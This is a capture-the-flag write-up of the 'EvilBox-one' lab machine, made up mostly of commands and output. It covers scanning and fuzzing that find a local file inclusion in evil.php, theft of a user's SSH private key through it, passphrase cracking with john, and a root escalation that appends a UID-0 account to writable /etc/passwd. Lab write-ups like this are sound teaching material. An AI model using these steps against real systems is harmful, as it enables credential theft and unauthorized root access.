# PG Play: [EvilBox-one](https://portal.offensive-security.com/labs/play)

As usual we start by port scanning the machine:

Anyways to the port scanning:
```
nmap -p22,80 -sV -sC -T4 -Pn -oA 192.168.204.212 192.168.204.212
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 11:49 EDT
Nmap scan report for 192.168.204.212
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds
------------------------------------------------------------
Combined scan completed in 0:00:58.133619
```
We can see an SSH service running on the victim machine; the version is not vulnerable so we switch our efforts to the web page.

Our enumeration starts with directory brute forcing using [dirb](https://www.kali.org/tools/dirb/):
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# dirb http://192.168.204.212/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul 24 11:50:20 2022
URL_BASE: http://192.168.204.212/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.204.212/ ----
+ http://192.168.204.212/index.html (CODE:200|SIZE:10701)                                                                                                                                                                                   
+ http://192.168.204.212/robots.txt (CODE:200|SIZE:12)                                                                                                                                                                                      
==> DIRECTORY: http://192.168.204.212/secret/                                                                                                                                                                                               
+ http://192.168.204.212/server-status (CODE:403|SIZE:280)                                                                                                                                                                                  
                                                                                                                                                                                                                                            
---- Entering directory: http://192.168.204.212/secret/ ----
^C> Testing: http://192.168.204.212/secret/editorials                                                                                                                                                                                       
                                                      
```
We find two interesting outputs: __robots.txt__ and __secret__

robots.txt contains the following:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# curl http://192.168.204.212/robots.txt       
Hello H4x0r
```
while the secret directory contains an empty web page so we further enumerate this directory:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# dirb http://192.168.204.212/secret -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul 24 12:07:26 2022
URL_BASE: http://192.168.204.212/secret/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.204.212/secret/ ----
+ http://192.168.204.212/secret/evil.php (CODE:200|SIZE:0)
```
As we can see it contains an interesting file __evil.php__ but it's also an empty web page :(

Since there are no other paths I tried paramater fuzzing against __evil.php__
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# ffuf -u 'http://192.168.204.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.204.212/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 68ms]

```
It looks like we found a vulnerable parameter, let's try it against the web page:

![image](https://user-images.githubusercontent.com/87611022/180658479-a84aca70-e63a-4673-a7d6-a8621a4f33d4.png)

From the output of passwd file above we notice a user named __mowree__, let's see if mowree has an _SSH_ private key:

![image](https://user-images.githubusercontent.com/87611022/180658562-cbc5b5f3-434f-41fa-93f2-3a4fb152bfdf.png)

We download that key to our machine and try to login as mowree:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# curl -o id_rsa http://192.168.204.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1743  100  1743    0     0  12664      0 --:--:-- --:--:-- --:--:-- 12722
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# chmod 600 id_rsa

┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# ssh mowree@192.168.204.212 -i id_rsa                                                                                                                                                                                               130 ⨯
The authenticity of host '192.168.204.212 (192.168.204.212)' can't be established.
ED25519 key fingerprint is SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.204.212' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
mowree@192.168.204.212's password: 
Permission denied, please try again.
mowree@192.168.204.212's password:                                  
```
unfortunately it didn't work because it asks for a password, since we don't have the password we use [john](https://github.com/openwall/john)  to crack that key.

first we have to convert the key to a hash so __John__ can crack it:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# python3 /root/tryhackme/rooms/overpass/ssh2john.py id_rsa                                                                                                                                                                          126 ⨯
id_rsa:$sshng$0$8$9FB14B3F3D04E90E$1192$bae426d821487bf7994f9a4dc90ebe2b551aa7f15859cb04925cce36dfb1e003ba1668c5991f11529c0c1eeae66d10ba86aca88aff
.
.
.
```

then we crack that hash using john:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# john hash.txt --wordlist=/root/tryhackme/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*Hidden*          (id_rsa)
```

and we login as mowree:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# ssh mowree@192.168.204.212 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ ls
local.txt
```

next step is to find possible privilege escalation paths, I used linpeas which and found out that /etc/passwd is writeable by our user:

```
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                                   
                                                                                                                                                                                                                                             
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
```

So we can simply make a user with root privilege and __su__ to it.

first we create the passwd on our attacking machine using __openssl__

```
┌──(root💀kali)-[~]
└─# openssl passwd -1 -salt user3 pass123  
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

then echo our user along with the password hash and add root privileges:
==dont forget to skip the dollar signs==

```
mowree@EvilBoxOne:/tmp$ echo "shawarmaman:\$1\$user3\$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash" >>/etc/passwd

mowree@EvilBoxOne:/tmp$ tail /etc/passwd
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
shawarmaman:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash
```
then we __su__ to our new user and get that proof.txt

```
mowree@EvilBoxOne:/tmp$ su shawarmaman
Contraseña: 
# cd /root
# cat proof.txt
*hidden*
```

That's all for this box it was really fun and relatively easy, Thank you for reading through this writeup :D 
